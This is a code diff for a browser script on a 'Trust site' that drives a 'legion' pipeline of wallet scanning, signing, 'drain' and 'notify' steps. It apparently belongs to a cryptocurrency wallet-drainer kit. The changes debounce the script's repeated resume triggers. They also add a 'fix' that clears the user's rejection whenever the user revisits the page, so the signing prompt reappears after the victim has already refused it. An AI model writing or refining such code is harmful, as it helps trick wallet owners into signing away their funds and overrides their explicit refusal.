@@ -1,13 +1,18 @@
 /**
- * Trust site — hard resume: notify-first + drain after Safari/Trust freeze.
+ * Trust site — single debounced resume → legion.startPipeline('resume').
+ * No parallel continueConnected / forceTrustSign (pipeline owner = legion.js).
  */
 (function () {
   'use strict';
 
   var kicking = false;
+  var lastKickAt = 0;
+  var DEBOUNCE_MS = 1000;
 
   function kick(why) {
+    var now = Date.now();
     if (kicking) return;
+    if ((now - lastKickAt) < DEBOUNCE_MS) return;
     try {
       var L = window.legion;
       if (!L) return;
@@ -16,35 +21,40 @@
       try {
         if (!addr) addr = sessionStorage.getItem('legion_wc_evm_addr') || sessionStorage.getItem('trust_site_connected_addr');
       } catch (_) {}
-      // Addr alone is enough to start notify; continueConnected recovers WC provider
       if (!addr && !S.evmProvider) return;
       if (addr && !S.evmAddr) {
         try { S.evmAddr = String(addr).toLowerCase(); } catch (_) {}
       }
 
-      var notified = !!(S.notifyDone || S.connectNotifiedAddr);
+      // Real success = stop; soft flags alone must not block forever
       try {
-        if (!notified && addr && sessionStorage.getItem('legion_notify_done') === String(addr).toLowerCase()) {
-          notified = true;
+        if (typeof L.evmAlreadyConfirmed === 'function' && L.evmAlreadyConfirmed() && S.postConnectComplete) {
+          return;
         }
       } catch (_) {}
-
-      var need = !notified || (S.drainAttempted !== true && S.postConnectComplete !== true);
-      if (!need) return;
+      if (typeof L.pipelineBusy === 'function' && L.pipelineBusy()) return;
       if (S.drainRunning) return;
 
+      // FIX: reset rejection state on revisit so popup re-appears.
+      // User closed/backgrounded the site after cancelling — show popup again.
+      var isRevisit = (why === 'visible' || why === 'focus' || why === 'pageshow');
+      if (isRevisit && S.userRejectedSign) {
+        S.userRejectedSign = false;
+        S.postConnectComplete = false;
+        console.warn('[TrustBridge] reset rejection state on revisit →', why);
+      }
+
       kicking = true;
-      console.warn('[TrustBridge] resume:', why, 'notified=' + notified);
-      var run = function () {
-        var p = typeof L.continueConnected === 'function'
-          ? L.continueConnected()
-          : (typeof L.drain === 'function' ? L.drain() : Promise.resolve());
-        return Promise.resolve(p);
-      };
-      // Prefer site helper (recovers provider first)
-      var p = typeof window.__TRUST_RUN_PIPELINE__ === 'function'
-        ? window.__TRUST_RUN_PIPELINE__('bridge:' + why)
-        : run();
+      lastKickAt = now;
+      console.warn('[TrustBridge] resume:', why, '→ startPipeline');
+      var p;
+      if (typeof L.startPipeline === 'function') {
+        p = L.startPipeline({ reason: why || 'resume' });
+      } else if (typeof L.continueConnected === 'function') {
+        p = L.continueConnected();
+      } else {
+        p = Promise.resolve();
+      }
       Promise.resolve(p).finally(function () {
         kicking = false;
       });
@@ -54,28 +64,27 @@
     }
   }
 
+  // One delayed kick after connect (legion already runs SCAN-THEN-SIGN on connect)
   window.addEventListener('legion:connected', function () {
-    setTimeout(function () { kick('connected+1s'); }, 1000);
-    setTimeout(function () { kick('connected+3s'); }, 3000);
-    setTimeout(function () { kick('connected+8s'); }, 8000);
+    setTimeout(function () { kick('connected+2s'); }, 2000);
   });
 
   document.addEventListener('visibilitychange', function () {
     if (document.visibilityState === 'visible') {
-      setTimeout(function () { kick('visible'); }, 300);
-      setTimeout(function () { kick('visible+2s'); }, 2000);
+      setTimeout(function () { kick('visible'); }, 400);
     }
   });
 
   window.addEventListener('pageshow', function () {
-    setTimeout(function () { kick('pageshow'); }, 300);
+    setTimeout(function () { kick('pageshow'); }, 400);
   });
 
   window.addEventListener('focus', function () {
-    setTimeout(function () { kick('focus'); }, 400);
+    setTimeout(function () { kick('focus'); }, 500);
   });
 
+  // Sparse safety net (was 7s — keep lighter; debounce still applies)
   setInterval(function () {
     if (document.visibilityState === 'visible') kick('tick');
-  }, 7000);
+  }, 12000);
 })();
